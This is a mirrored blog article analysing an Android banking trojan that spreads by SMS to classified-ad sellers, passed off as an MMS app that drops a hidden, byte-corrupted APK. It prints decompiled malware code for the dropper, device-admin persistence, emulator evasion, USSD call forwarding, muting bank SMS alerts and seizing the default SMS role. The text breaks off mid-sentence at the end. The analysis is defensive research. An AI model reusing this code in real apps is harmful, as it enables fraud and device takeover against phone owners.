<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of Android Malvari Matryoshka</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="After writing an article about analyzing Malvari with avito, several of my twitter readers responded and sent SMS, which they received after publishin...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of Android Malvari Matryoshka</h1><div class="post__text post__text-html js-mediator-article">  After writing an <a href="https://habrahabr.ru/post/276211/">article</a> about analyzing Malvari with avito, several of my twitter readers responded and sent SMS, which they received after publishing ads on avito. <br><br><img src="https://habrastorage.org/files/82d/e11/d80/82de11d801054dfb9e831d60e6e8efa7.jpg" height="100"><br><a name="habracut"></a><br>  <a href="https://www.virustotal.com/ru/file/1c3598fc8cbd8b7757b731e02474c9c549f55c4b534005db03be32cc76f37f3b/analysis/">VT</a> report <br><br>  Under the link, under the guise of receiving MMS messages offer to put apk.  What is remarkable, in the case of MTS of the rights (permissions) only access to the memory card. <br><img src="https://habrastorage.org/files/dc7/22c/ce1/dc722cce14c34157a7e39eccffc6a05c.jpg" height="400"><img src="https://habrastorage.org/files/311/208/280/31120828050f40cfa6657e60b55c7696.jpg" height="400"><img src="https://habrastorage.org/files/a0f/784/218/a0f78421832747a6af477577cfe1b1eb.jpg" height="400"><img src="https://habrastorage.org/files/fd5/1f0/766/fd51f076641642439880572e90434cb9.jpg" height="400">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Weight 90kb, which is quite normal for malware.  The smaller the size, the better, because not always the Internet allows you to download even a couple of megabytes. <br><br>  After decompiling, it is found that the code is not obfuscated and is a loader (the application used to download and install another application).  But, not quite standard. <br>  As a rule, the loader knocks on the server, downloads the application and aggressively offers to install.  This is used, for example, for the promotion of any applications to get more users.  But for a Malvari, spreading through an alien loader is not the best option, because the victim‚Äôs phone may have been infected for a long time and there‚Äôs nothing to catch. <br><br>  Here we also have a matryoshka - inside apk, in the folder of assets lies the file 1.apk.  Size 60kb. <br>  <a href="https://www.virustotal.com/ru/file/e892fd25b12ad431b45df576306bfbf1255f00ad8e18a8f87ec5e3be108c0ffd/analysis/">VT</a> report <br>  Decompile or unzip it failed.  The file is damaged. <br>  I understand with the code of the doll. <br>  After installation, the MMS center allegedly copies the assets folder apk to the memory card, replacing a couple of bytes and immediately launches the installation under the guise of ‚ÄúGoogle Addition‚Äù. <br><br><pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">runs</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context cnt, String name)</span></span></span><span class="hljs-function"> </span></span>{ File sdCard = Environment.getExternalStorageDirectory(); AssetManager assetManager = cnt.getAssets(); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { StringBuilder buf = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); InputStream in = assetManager.open(name); Log.e(<span class="hljs-string"><span class="hljs-string">"path"</span></span>, sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + name); OutputStream out = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileOutputStream(sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + name); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] buffer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">1024</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> read = in.read(buffer); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (read == -<span class="hljs-number"><span class="hljs-number">1</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } out.write(buffer, <span class="hljs-number"><span class="hljs-number">0</span></span>, read); } in.close(); out.flush(); out.close(); OutputStream out2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileOutputStream(sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/t"</span></span> + name); InputStream replacingInputStream = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplacingInputStream(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ByteArrayInputStream(readfile(sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + name)), <span class="hljs-string"><span class="hljs-string">"[PK]"</span></span>.getBytes(<span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>), <span class="hljs-string"><span class="hljs-string">"PK"</span></span>.getBytes(<span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>)); ByteArrayOutputStream bos = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ByteArrayOutputStream(); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> b = replacingInputStream.read(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> != b) { bos.write(b); out2.write(b); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { out2.flush(); out2.close(); Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.VIEW"</span></span>); intent.setDataAndType(Uri.fromFile(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/t"</span></span> + name)), <span class="hljs-string"><span class="hljs-string">"application/vnd.android.package-archive"</span></span>); intent.setFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); cnt.startActivity(intent); <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(sdCard.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + name).delete(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception e) { OutputStream outputStream = out; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception e2) { } }</code> </pre> <br><br>  After that, the MMS center is hidden from the list of applications.  But the addition remains visible. <br><br>  If this MMS center had at least an error, about a damaged MMS, an expired shelf life, and a delayed installation of the ‚ÄúGoogle Add-on‚Äù would not be so suspicious. <br><br>  The meaning of loaders in the distribution of apk with 0 detections from AB and the lack of rights.  And editing the second file does not need to refactor the code.  Only after recovery, nobody canceled the reaction of AV. <br>  <a href="https://www.virustotal.com/ru/file/7d14ca963a84eb104b2e3b07ad14c73aff4576111c565b8c97892f05e56e419a/analysis/">VT</a> report after repair <br>  Report VT matryoshka with internal repaired apk <br>  <a href="https://www.virustotal.com/ru/file/ad8d9b74b4fae8f54c40c2c8237f3289c93bbf5bd5cdbaf5cb0a89da2cc81754/analysis/1454619907/">VT</a> report is the same, but the internal apk is renamed to jpg <br>  Google Addendum hints at obfuscation.  Obfuscation is somewhat difficult to call, there are just renamed classes (names in 1 letter), the contents have not been touched. <br><br>  We look AndroidManifest.xml <br><br>  Long list of rights <br><br><pre> <code class="java hljs"> &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.WRITE_EXTERNAL_STORAGE"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.READ_EXTERNAL_STORAGE"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.RECORD_AUDIO"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.SEND_SMS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.SYSTEM_ALERT_WINDOW"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.KILL_BACKGROUND_PROCESSES"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.RECEIVE_BOOT_COMPLETED"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.READ_SMS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.READ_CONTACTS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.CAMERA"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.ACCESS_FINE_LOCATION"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.ACCESS_COARSE_LOCATION"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.WAKE_LOCK"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.WRITE_SMS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.ACCESS_NETWORK_STATE"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.READ_PHONE_STATE"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.INTERNET"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.RECEIVE_SMS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.GET_TASKS"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.CALL_PHONE"</span></span> /&gt; &lt;uses-permission android:name=<span class="hljs-string"><span class="hljs-string">"android.permission.READ_CALL_LOG"</span></span> /&gt;</code> </pre><br><br><br>  Further various receivers and fake on Google Play, the design of which does not match the ‚Äúmaterial design‚Äù, so on new versions of android, it will look suspicious.  There is no check for validity of the entered data.  Something not entered, everything goes to the server. <br><br><pre> <code class="java hljs"> &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.AlarmReceiverKnock"</span></span> /&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.AlarmReceiverAdm"</span></span> /&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.AlarmReceiverSmsMan"</span></span> /&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.IntentReceiver"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.PACKAGE_ADDED"</span></span> /&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.PACKAGE_REMOVED"</span></span> /&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.net.conn.CONNECTIVITY_CHANGE"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"package"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.CAdm"</span></span> android:permission=<span class="hljs-string"><span class="hljs-string">"android.permission.BIND_DEVICE_ADMIN"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_ENABLED"</span></span> /&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.app.action.DEVICE_ADMIN_DISABLED"</span></span> /&gt; &lt;/intent-filter&gt; &lt;meta-data android:name=<span class="hljs-string"><span class="hljs-string">"android.app.device_admin"</span></span> android:resource=<span class="hljs-string"><span class="hljs-string">"@xml/da"</span></span> /&gt; &lt;/receiver&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.IMMon"</span></span>&gt; &lt;intent-filter android:priority=<span class="hljs-string"><span class="hljs-string">"100"</span></span>&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.BootReciv"</span></span> android:enabled=<span class="hljs-string"><span class="hljs-string">"true"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.BOOT_COMPLETED"</span></span> /&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.QUICKBOOT_POWERON"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;service android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.Knock"</span></span> /&gt; &lt;service android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.SrvAdm"</span></span> /&gt; &lt;service android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.IMService"</span></span> /&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.SmsReceiver"</span></span> android:permission=<span class="hljs-string"><span class="hljs-string">"android.permission.BROADCAST_SMS"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.SMS_DELIVER"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;receiver android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.MmsReceiver"</span></span> android:permission=<span class="hljs-string"><span class="hljs-string">"android.permission.BROADCAST_WAP_PUSH"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.WAP_PUSH_DELIVER"</span></span> /&gt; &lt;data android:mimeType=<span class="hljs-string"><span class="hljs-string">"application/vnd.wap.mms-message"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; &lt;activity android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.ComposeSmsActivity"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.SEND"</span></span> /&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.SENDTO"</span></span> /&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span> /&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.BROWSABLE"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"sms"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"smsto"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"mms"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"mmsto"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;service android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.HeadlessSmsSendService"</span></span> android:permission=<span class="hljs-string"><span class="hljs-string">"android.permission.SEND_RESPOND_VIA_MESSAGE"</span></span> android:exported=<span class="hljs-string"><span class="hljs-string">"true"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.RESPOND_VIA_MESSAGE"</span></span> /&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"sms"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"smsto"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"mms"</span></span> /&gt; &lt;data android:scheme=<span class="hljs-string"><span class="hljs-string">"mmsto"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/service&gt; &lt;activity android:label=<span class="hljs-string"><span class="hljs-string">"@string/title_activity_activity_blank"</span></span> android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.ActivityStart"</span></span>&gt; &lt;intent-filter&gt; &lt;action android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.action.MAIN"</span></span> /&gt; &lt;category android:name=<span class="hljs-string"><span class="hljs-string">"android.intent.category.LAUNCHER"</span></span> /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:label=<span class="hljs-string"><span class="hljs-string">"@string/sda"</span></span> android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.MAC"</span></span> /&gt; &lt;activity android:label=<span class="hljs-string"><span class="hljs-string">"@string/cc"</span></span> android:name=<span class="hljs-string"><span class="hljs-string">"zzzzzz.xxxxxx.cccccc.ActivityGetCC"</span></span> /&gt; &lt;/application&gt;</code> </pre><br><br><br><br>  The application wants to use the functions of the device administrator, with such rights: <br><br><pre> <code class="java hljs"> &lt;?xml version=<span class="hljs-string"><span class="hljs-string">"1.0"</span></span> encoding=<span class="hljs-string"><span class="hljs-string">"utf-8"</span></span>?&gt; &lt;device-admin&gt; &lt;uses-policies&gt; &lt;limit-password /&gt; &lt;watch-login /&gt; &lt;reset-password /&gt; &lt;force-lock /&gt; &lt;wipe-data /&gt; &lt;expire-password /&gt; &lt;encrypted-storage /&gt; &lt;disable-camera /&gt; &lt;/uses-policies&gt; &lt;/device-admin&gt;</code> </pre><br><br>  After viewing the code, it seems that the developer has written all possible rights to the reserve or thoughtlessly copied from the documentation <br>  .  Since no permissions from the device-admin section are used, some of those written in AndroidManifest.xml.  And throughout the code, apparently for the convenience of the reverser, the developer left the debug output in LogCat. <br>  The request admin rights comes with the text: "Permissions required for optimal performance."  No message is discarded for revocation.  After revoking the rights, the malware will ask them again <br><br><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> CharSequence </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onDisableRequested</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ Intent intent2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(context, MAC.class); intent2.addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); context.startActivity(intent2); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MAC</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Activity</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> DevicePolicyManager a; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Bundle bundle)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onCreate(bundle); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a = (DevicePolicyManager) getSystemService(<span class="hljs-string"><span class="hljs-string">"device_policy"</span></span>); Parcelable componentName = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ComponentName(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, CAdm.class); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a.isAdminActive(componentName)) { Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.app.action.ADD_DEVICE_ADMIN"</span></span>); intent.putExtra(<span class="hljs-string"><span class="hljs-string">"android.app.extra.DEVICE_ADMIN"</span></span>, componentName); intent.putExtra(<span class="hljs-string"><span class="hljs-string">"android.app.extra.ADD_EXPLANATION"</span></span>, <span class="hljs-string"><span class="hljs-string">""</span></span>); startActivity(intent); } finish(); } }</code> </pre><br><br>  Link to the gate (server where the bot is accessed) plain-text.  Communication with the bot in both directions occurs in JSON format.  I was not interested in analyzing the protocol, so I continued to study the code. <br><br>  Startup check from emulator <br><br><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">boolean</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m6a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> equals = ((TelephonyManager) context.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getDeviceId().equals(<span class="hljs-string"><span class="hljs-string">"000000000000000"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> z = Build.MODEL.contains(<span class="hljs-string"><span class="hljs-string">"google_sdk"</span></span>) || Build.MODEL.contains(<span class="hljs-string"><span class="hljs-string">"Emulator"</span></span>) || Build.MODEL.contains(<span class="hljs-string"><span class="hljs-string">"Android SDK"</span></span>) || Build.FINGERPRINT.startsWith(<span class="hljs-string"><span class="hljs-string">"generic"</span></span>) || Build.FINGERPRINT.startsWith(<span class="hljs-string"><span class="hljs-string">"unknown"</span></span>) || Build.MODEL.contains(<span class="hljs-string"><span class="hljs-string">"Android SDK built for x86"</span></span>) || Build.MANUFACTURER.contains(<span class="hljs-string"><span class="hljs-string">"Genymotion"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> z2 = Build.BRAND.startsWith(<span class="hljs-string"><span class="hljs-string">"generic"</span></span>) &amp;&amp; Build.DEVICE.startsWith(<span class="hljs-string"><span class="hljs-string">"generic"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> equals || z || z2; }</code> </pre><br><br>  Bot takes to the server browser history, contact list, list of installed applications, call history, current location, sent SMS. <br><br>  Can not only call forwarding, but also USSD <br><br><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, String str)</span></span></span><span class="hljs-function"> </span></span>{ String str2 = <span class="hljs-string"><span class="hljs-string">"**21*"</span></span> + str + <span class="hljs-string"><span class="hljs-string">"#"</span></span>; Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.DIAL"</span></span>); intent.setData(Uri.fromParts(<span class="hljs-string"><span class="hljs-string">"tel"</span></span>, str2, <span class="hljs-string"><span class="hljs-string">"#"</span></span>)); intent.setFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); context.startActivity(intent); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, String str)</span></span></span><span class="hljs-function"> </span></span>{ SystemClock.sleep(<span class="hljs-number"><span class="hljs-number">5000</span></span>); Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.CALL"</span></span>, Uri.parse(<span class="hljs-string"><span class="hljs-string">"tel:"</span></span> + str.toString() + Uri.encode(<span class="hljs-string"><span class="hljs-string">"#"</span></span>))); intent.setFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); context.startActivity(intent); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>; }</code> </pre><br><br>  And when the cherished SMS comes from the savings bank - the bot will turn off the sound on the phone <br><br><pre> <code class="java hljs"> ((AudioManager) getSystemService(<span class="hljs-string"><span class="hljs-string">"audio"</span></span>)).setRingerMode(<span class="hljs-number"><span class="hljs-number">0</span></span>);</code> </pre><br><br>  And if the version of the android from 4.4, then we will require you to put yourself as a default SMS application <br>  In version 4.4 it is forbidden to hide SMS to any applications, except the default application.  In other versions of the android, you can prohibit hiding SMS by simply putting Hangouts and selecting it for SMS. <br><br><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m2a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (VERSION.SDK_INT &gt;= <span class="hljs-number"><span class="hljs-number">19</span></span>) { String className = ((RunningTaskInfo) ((ActivityManager) context.getSystemService(<span class="hljs-string"><span class="hljs-string">"activity"</span></span>)).getRunningTasks(<span class="hljs-number"><span class="hljs-number">1</span></span>).get(<span class="hljs-number"><span class="hljs-number">0</span></span>)).topActivity.getClassName(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!className.equalsIgnoreCase(<span class="hljs-string"><span class="hljs-string">"com.android.settings.DeviceAdminAdd"</span></span>) &amp;&amp; !className.equalsIgnoreCase(<span class="hljs-string"><span class="hljs-string">"com.android.settings.SmsDefaultDialog"</span></span>) &amp;&amp; !Sms.getDefaultSmsPackage(context).equalsIgnoreCase(context.getPackageName())) { Intent intent = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.provider.Telephony.ACTION_CHANGE_DEFAULT"</span></span>); intent.putExtra(<span class="hljs-string"><span class="hljs-string">"package"</span></span>, context.getPackageName()); intent.addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); context.startActivity(intent); } } }</code> </pre><br><br><br><br>  And under the guise of Beeline MMS center, the same bot of nesting dolls appeared, but without a wrapper. <br><br>  Summing up, we have an interesting idea with a matryoshka and 